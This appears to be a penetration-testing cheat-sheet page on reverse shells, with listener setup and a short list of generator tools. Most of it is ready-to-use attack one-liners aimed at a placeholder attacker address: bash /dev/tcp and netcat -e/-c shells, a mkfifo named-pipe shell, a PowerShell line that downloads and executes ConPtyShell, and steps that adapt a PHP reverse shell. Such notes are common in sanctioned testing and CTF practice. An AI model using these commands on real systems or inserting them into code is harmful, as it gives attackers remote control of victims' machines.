# Reverse shell

[Go back](../index.md#remote-shell-)

<div class="row row-cols-md-2"><div>

A reverse shell is a shell in which a victim <small>(client)</small> connects to a server <small>(hacker)</small> allowing us to use the victim to exploit the remote host.

Most reverse shell are connecting to a netcat server. The server could run on port 4444 <small>(up to you!)</small>, giving us:

```shell!
$ nc -lvnp 4444
```

You will have to configure your reverse shells to connect back to it. We consider the server IP to be `x.y.z.t`, port `4444` in commands below.
</div><div>

If your target is missing a binary, you may be able to download a precompiled version on [andrew-d GitHub](https://github.com/andrew-d/static-binaries/tree/master/binaries) (2.5k ⭐).
</div></div>

<hr class="sep-both">

## revshells.com

<div class="row row-cols-md-2"><div>

The best way to create reverse shells is to use the website [revshells](https://www.revshells.com/).

* Example: "Bash" client

```shell!
$ sh -i >& /dev/tcp/x.y.z.t/4444 0>&1
```

* Example: "nc.exe -e" client

```shell!
PS> nc.exe x.y.z.t 4444 -e sh
```

➡️ Select one based on what command you can run on the target.
</div><div>

Other alternatives are:

* [revshellgen](https://github.com/t0thkr1s/revshellgen) (0.4k ⭐, script)
* [ShellPop](https://github.com/0x00-0x00/ShellPop) (1.4k ⭐, script, 2018/2019)
</div></div>

<hr class="sep-both">

## PHP reverse shell

<div class="row row-cols-md-2"><div>

You could check out [this script by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (1.4k ⭐, 2015). This is a well-known reference.

On Kali Linux, there is local copy in `/usr/share/webshells/php/`.

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php /tmp/revshell.php
$ sed -i 's/127.0.0.1/x.y.z.t/' /tmp/revshell.php
$ sed -i 's/1234/4444/' /tmp/revshell.php
```
</div><div>
</div></div>

<hr class="sep-both">

## netcat client

[![introtoshells](../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)

<div class="row row-cols-md-2"><div>

The most common usage is:

```ps
$ nc -c /bin/bash x.y.z.t 4444
```
</div><div>

Netcat option `-e` is often not available due to security measures.

```ps
$ nc x.y.z.t 4444 -e /bin/bash
```
</div></div>

<hr class="sep-both">

## Linux targets

<div class="row row-cols-md-2"><div>

#### TCP socket

```shell!
$ /bin/bash -i >& /dev/tcp/x.y.z.t/4444 0>&1
```
</div><div>

#### Named pipe

```shell!
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc x.y.z.t 4444 >/tmp/f
```
</div></div>

<hr class="sep-both">

## Windows targets

<div class="row row-cols-md-2"><div>

You can try [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) (0.7k ⭐).

```ps
PS> IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)
PS> Invoke-ConPtyShell x.y.z.t 4444
```
</div><div>

You can try [powercat](https://github.com/besimorhino/powercat) <small>(1.8k ⭐, powershell netcat client/server)</small>
</div></div>